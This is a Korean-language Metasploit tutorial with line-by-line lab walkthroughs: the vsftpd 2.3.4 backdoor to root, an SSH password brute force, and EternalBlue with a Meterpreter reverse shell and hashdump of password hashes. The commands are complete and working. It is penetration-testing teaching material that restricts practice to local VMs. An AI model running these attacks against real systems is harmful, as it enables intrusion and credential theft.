1. 메타스플로잇 프레임워크 핵심 아키텍처 이해

MSF (Metasploit Framework, 메타스플로잇 프레임워크)는 IT 인프라에 존재하는 취약점을 검증하고, 모의 해킹(Penetration Testing, 침투 테스트)을 자동화하기 위해 설계된 세계 표준 오픈소스 보안 플랫폼입니다.

접점 인터페이스 (User Interfaces)

msfconsole msfvenom Armitage (GUI)
➔
MSF Core / Base (루비 엔진)
➔

기능별 모듈 (Modules)

Exploits
취약점 공격 코드
Payloads
침투 후 실행 악성코드
Auxiliary
스캐닝 및 정보 수집
Post
침투 성공 후 권한 유지
※ MSF 사용자는 msfconsole 인터페이스를 통해 Core 엔진에 명령을 내리고, 각 기능별 모듈을 조합하여 타겟을 공격합니다.
시스템 관리자와 아키텍트는 단순한 도구 사용법을 넘어, 공격자가 Exploit(익스플로잇, 취약점 공격 코드)을 통해 방화벽을 우회하고 Payload(페이로드, 공격 성공 후 실행되는 악성 코드)를 메모리에 적재하는 전체 프로세스의 아키텍처를 이해해야만 완벽한 방어망을 설계할 수 있습니다.
핵심 모듈 명칭 원어 및 한글 의미 기능 상세 설명 및 실무 역할
Exploit 취약점 공격 코드 타겟 시스템(OS, 웹 서버, FTP 등)의 소프트웨어 버그나 설계상 결함을 찌르고 들어가, 보안 통제를 무력화하는 해킹의 첫 번째 단계 '문 열기' 역할을 수행합니다.
Payload 적재물 (실행 악성코드) Exploit이 문을 열어주면, 그 틈으로 시스템 내부에 전달되어 실제로 파괴적인 동작(백도어 설치, 데이터 유출, 셸 획득)을 수행하는 실질적인 '폭탄'입니다.
Auxiliary 보조 모듈 (스캐너) 직접적인 공격(Exploit)을 수행하지 않고, 타겟 시스템의 열린 포트나 취약점 존재 여부를 확인하는 스캐닝(Scanning)과 정보 수집(Footprinting, 풋프린팅)을 담당합니다.
AWS 클라우드 환경 침투 테스트 시 윤리 및 과금 경고
AWS(Amazon Web Services, 아마존 웹 서비스) 환경에 구축된 EC2(Elastic Compute Cloud, 크기 조정 가능한 컴퓨팅 용량) 인스턴스에서 MSF를 구동하는 것 자체는 기본 인프라 비용 외에 추가 과금이 발생하지 않습니다.

하지만, 자신이 소유하지 않은 타인의 IP나 외부 공인 IP를 향해 포트 스캐닝(Auxiliary)이나 익스플로잇(Exploit)을 시도하는 행위는 AWS AUP(Acceptable Use Policy, 허용되는 사용 정책) 위반으로 즉시 계정이 영구 정지(Suspension)될 수 있습니다. 실습은 반드시 로컬 가상 머신(VirtualBox, VMware 등) 내부의 사설 IP 망에서만 진행하십시오.

2. 모의 해킹 실무 워크플로우 및 CLI 필수 명령어

MSF의 가장 강력하고 표준적인 인터페이스는 CLI(Command Line Interface, 텍스트 명령줄 인터페이스) 환경인 msfconsole입니다. 모의 해킹은 철저한 절차(정보 수집 → 모듈 검색 → 옵션 설정 → 공격 실행)에 따라 단계별로 진행됩니다.
1. 대상 스캐닝
Nmap / Auxiliary
➔
2. 모듈 검색
search 명령어
➔
3. 옵션 세팅
set RHOSTS 등
➔
4. 공격 및 장악
exploit 명령어
※ 성공적인 침투 테스트를 위해 반드시 거쳐야 하는 4단계 표준 워크플로우(Standard Workflow)입니다.
프레임워크 내부에서 길을 잃지 않으려면 아래의 5가지 핵심 명령어를 완벽히 숙지해야 합니다. 이 명령어들은 모든 취약점 진단 시나리오에서 변함없이 공통으로 적용되는 절대적인 워크플로우(Workflow, 작업 흐름)입니다.

필수 명령어(Commands) 명세서

명령어 기능 설명 실무 활용 예시 및 팁
search [키워드] 모듈 검색 Nmap(네트워크 스캐너)으로 확인된 서비스 이름(예: Apache, ProFTPD, Windows 10)을 입력하여 관련 Exploit을 찾습니다.
팁: search type:exploit platform:windows 처럼 필터를 걸 수 있습니다.
use [경로/번호] 모듈 장착 검색된 결과 목록 중 사용할 취약점 코드를 선택하여 장착합니다.
예: use exploit/windows/smb/ms17_010_eternalblue
show options 필수 옵션 확인 선택한 공격 코드가 작동하기 위해 반드시 입력해야 하는 설정값(IP, Port 등) 목록과 현재 설정 상태를 출력합니다. 'Required' 열이 'yes'인 항목은 빈칸으로 두면 공격이 실행되지 않습니다.
set [변수명] [값] 옵션 값 설정 공격 대상의 IP(RHOSTS)나 공격자의 IP(LHOST)를 환경 변수에 세팅합니다.
예: set RHOSTS 192.168.0.50
exploit (또는 run) 공격 개시 모든 설정이 완료된 후, 취약점 공격 코드를 타겟으로 발사합니다. 성공 시 셸(Shell, 제어 권한) 세션이 열립니다.

3. 실전 모의 해킹 시나리오 I: vsftpd 백도어 침투

가장 직관적이고 대표적인 취약점인 vsftpd 2.3.4 Backdoor (백도어, 뒷문) Command Execution 모듈을 활용하여, 타겟 시스템에 침투하고 최고 관리자(root) 셸(Shell)을 획득하는 전 과정을 단계별로 실습합니다.

Step 1. 프레임워크 실행 및 모듈 검색

root@kali:~
┌──(root㉿kali)-[~] └─# msfconsole -q msf6 > search vsftpd Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/unix/ftp/vsftpd_234_backdoor 2011-07-03 excellent No VSFTPD v2.3.4 Backdoor Command Execution
실행 명령어 및 출력 결과한 줄 분석 (Line-by-Line Analysis)
msfconsole -q 메타스플로잇 프레임워크의 대화형 콘솔(CLI) 환경을 시작합니다. -q (quiet) 옵션을 주면 초기 실행 시 나타나는 무거운 배너(아스키 아트 그림) 출력을 생략하고 빠르게 프롬프트를 띄웁니다.
search vsftpd 로컬 데이터베이스에 저장된 수많은 모듈 중에서 'vsftpd'와 관련된 취약점 모듈만을 빠르고 정확하게 필터링하여 검색합니다.
Rank: excellent 해당 취약점 공격 코드의 신뢰도를 나타냅니다. excellent (매우 높음) 등급은 타겟 시스템을 다운(Crash)시키지 않고 안정적으로 권한을 획득할 확률이 가장 높은, 검증된 Exploit임을 의미합니다.

Step 2. 모듈 장착 및 타겟(RHOSTS) 설정

msfconsole
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor [*] No payload configured, defaulting to cmd/unix/interact msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.50.100 RHOSTS => 192.168.50.100 msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options Module options (exploit/unix/ftp/vsftpd_234_backdoor): Name Current Setting Required Description ---- --------------- -------- ----------- CHOST no The local client address CPORT no The local client port RHOSTS 192.168.50.100 yes The target host(s), see https://docs.metasploit.com/ RPORT 21 yes The target port (TCP)
실행 명령어 및 출력 결과한 줄 분석 (Line-by-Line Analysis)
use exploit/... 식별된 경로의 공격 모듈을 시스템 메모리에 로드(장착)합니다. 프롬프트가 msf6 exploit(...) > 형태로 변경되어 해당 모듈 컨텍스트 안으로 성공적으로 진입했음을 시각적으로 나타냅니다.
set RHOSTS 192.168... RHOSTS (Remote Hosts, 원격 타겟 시스템 호스트) 변수를 설정합니다. 즉, 우리가 공격할 희생자 서버의 IP 주소를 지정하는 가장 중요한 핵심 단계입니다.
show options 현재 모듈에서 요구하는 설정값(IP, Port 등) 목록을 출력합니다. 'Required(필수)' 열이 'yes'인 RHOSTS와 RPORT(21번)가 정상적으로 세팅되었는지 공격 전 최종 검증합니다.

Step 3. 익스플로잇(Exploit) 실행 및 권한 획득

msfconsole
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit [*] 192.168.50.100:21 - Banner: 220 (vsFTPd 2.3.4) [*] 192.168.50.100:21 - USER: 331 Please specify the password. [+] 192.168.50.100:21 - Backdoor service has been spawned, handling... [+] 192.168.50.100:21 - UID: uid=0(root) gid=0(root) groups=0(root) [*] Found shell. [*] Command shell session 1 opened (192.168.50.10:39485 -> 192.168.50.100:6200) at 2026-03-18 05:30:00 +0900 whoami root hostname metasploitable
실행 명령어 및 출력 결과한 줄 분석 (Line-by-Line Analysis)
exploit 설정된 값들을 바탕으로 타겟 시스템을 향해 실제 취약점 공격 코드를 발사(개시)합니다.
Banner: 220 (vsFTPd...) 공격 코드를 실행하기 전, 대상 포트(21번)에 접속하여 구동 중인 데몬의 버전이 취약한 2.3.4 버전이 맞는지 Banner Grabbing(배너 그래빙, 서비스 정보 수집)을 수행하여 확인합니다.
Backdoor service spawned vsftpd 2.3.4 소스코드에 심어져 있던 백도어 로직(USER 명령에 :) 이모티콘 전송 시 6200 포트 개방)을 성공적으로 발동(Spawn)시켰음을 의미합니다.
UID: uid=0(root) 열린 6200 포트로 접속해보니, 해당 프로세스가 리눅스 시스템의 최고 관리자인 root (사용자 식별자 0번) 권한으로 실행되고 있음을 확인했습니다. 치명적인 시스템 장악 단계입니다.
Session 1 opened 공격자 PC와 타겟 서버 간의 백그라운드 연결 채널(세션 1)이 성공적으로 생성되었습니다. 이제 whoami 등 임의의 OS 명령어를 타겟 서버에서 마음대로 실행할 수 있습니다.

4. 실전 모의 해킹 시나리오 II: Auxiliary 스캐너 활용

운영체제나 서비스에 명백한 소프트웨어 결함(Exploit)이 없을 때 해커들이 가장 많이 사용하는 방법은 바로 Authentication Brute Force (인증 무차별 대입 공격)입니다. MSF의 Auxiliary(보조 모듈) 기능을 활용하여 SSH 서버의 취약한 패스워드를 알아내는 과정을 실습합니다.
msfconsole
msf6 > use auxiliary/scanner/ssh/ssh_login msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 192.168.50.101 RHOSTS => 192.168.50.101 msf6 auxiliary(scanner/ssh/ssh_login) > set USER_FILE /root/users.txt USER_FILE => /root/users.txt msf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /root/passwords.txt PASS_FILE => /root/passwords.txt msf6 auxiliary(scanner/ssh/ssh_login) > run [*] 192.168.50.101:22 - Starting bruteforce [-] 192.168.50.101:22 - Failed: 'admin:12345' [-] 192.168.50.101:22 - Failed: 'admin:password' [+] 192.168.50.101:22 - Success: 'admin:admin123' 'uid=1000(admin) gid=1000(admin)' [*] Command shell session 2 opened (192.168.50.10:48211 -> 192.168.50.101:22) [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed
실행 명령어 및 출력 결과한 줄 분석 (Line-by-Line Analysis)
use auxiliary/.../ssh_login 직접적인 시스템 파괴 목적이 아닌, 정보 수집 및 인증 취약점 진단을 목적으로 설계된 Auxiliary (보조 스캐너 모듈) 중 SSH 로그인 시도 모듈을 장착합니다.
set USER_FILE ...
set PASS_FILE ...		 해커가 사전에 수집한 유력한 계정명 목록(users.txt)과 자주 쓰이는 비밀번호 사전 파일(Dictionary File, passwords.txt)의 절대 경로를 변수에 매핑합니다.
run Auxiliary 모듈은 Exploit 모듈과 달리 직접적인 시스템 파괴 공격이 아니므로 관례적으로 exploit 대신 run 명령어를 입력하여 실행합니다.
Failed: 'admin:12345' 사전 파일에 있는 조합을 타겟 서버의 22번 포트(SSH)에 무차별적으로 대입(Brute Force)하며, 실패한 기록을 화면에 출력합니다. (이 과정에서 타겟 서버의 auth.log에 엄청난 에러 로그가 남게 됩니다.)
Success: 'admin:admin123' 수많은 시도 끝에 일치하는 계정과 패스워드 조합을 찾아냈습니다! 즉시 로그인하여 권한(uid=1000)을 확인하고, 통제 가능한 Command Shell 세션을 자동으로 열어줍니다.

5. 실전 모의 해킹 시나리오 III: 윈도우 원격 코드 실행 및 미터프리터

전 세계를 휩쓸었던 랜섬웨어 '워너크라이(WannaCry)'의 핵심 전파 기술이었던 MS17-010 (EternalBlue, 이터널블루) 취약점을 이용해 윈도우 서버를 장악하고, 추적을 피하는 Meterpreter(미터프리터) 리버스 셸을 주입하는 최고급 기법입니다.
msfconsole
msf6 > use exploit/windows/smb/ms17_010_eternalblue msf6 exploit(...) > set RHOSTS 192.168.50.102 RHOSTS => 192.168.50.102 msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp PAYLOAD => windows/x64/meterpreter/reverse_tcp msf6 exploit(...) > set LHOST 192.168.50.10 LHOST => 192.168.50.10 msf6 exploit(...) > exploit [*] Started reverse TCP handler on 192.168.50.10:4444 [*] 192.168.50.102:445 - Connecting to target for exploitation. [+] 192.168.50.102:445 - Target OS selected valid for OS indicated by SMB reply [*] 192.168.50.102:445 - Sending all but last fragment of exploit packet [*] Sending stage (200262 bytes) to 192.168.50.102 [*] Meterpreter session 3 opened (192.168.50.10:4444 -> 192.168.50.102:49158) meterpreter > getuid Server username: NT AUTHORITY\SYSTEM meterpreter > hashdump Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
실행 명령어 및 출력 결과한 줄 분석 (Line-by-Line Analysis)
use .../ms17_010_eternalblue 윈도우의 파일 공유 프로토콜인 SMB(Server Message Block)의 치명적인 메모리 결함을 찌르는 EternalBlue(이터널블루) 공격 모듈을 장착합니다.
set PAYLOAD .../reverse_tcp 공격 성공 후 주입할 악성코드로, 앞서 배운 Reverse Shell (리버스 셸, 역방향 접속) 방식을 사용하는 In-Memory(메모리 상주형) 백도어인 미터프리터(Meterpreter)를 명시적으로 세팅합니다.
set LHOST 192.168.50.10 리버스 셸이 성공했을 때, 타겟 컴퓨터가 거꾸로 접속을 맺어야 할 LHOST (Local Host, 해커 본인의 IP)를 알려줍니다. 이 설정이 틀리면 공격에 성공해도 연결을 돌려받을 수 없습니다.
Started reverse TCP handler 공격 개시 직후, 해커의 PC가 자신의 4444번 포트를 열고 타겟이 역으로 걸어올 전화를 기다리기(Listen) 시작함을 알립니다.
Sending stage (200262 bytes) SMB 취약점 버퍼 오버플로우 공격이 성공하여 구멍이 뚫렸고, 그 틈새로 약 200KB 크기의 미터프리터(Meterpreter) 페이로드 핵심 코드를 타겟 RAM(메모리)에 직접 전송(주입)하고 있습니다.
meterpreter > getuid 강력한 미터프리터 프롬프트를 획득했습니다! getuid를 쳐보니 윈도우 OS의 신(God)과 같은 최고 권한인 NT AUTHORITY\SYSTEM 권한을 단번에 탈취했음을 확인했습니다.
hashdump 최고 권한을 바탕으로, 포스트 익스플로잇(Post-Exploitation) 명령어인 hashdump를 실행하여 윈도우 내부 SAM 파일에 암호화되어 저장된 모든 사용자의 비밀번호 해시값을 통째로 유출시켰습니다.
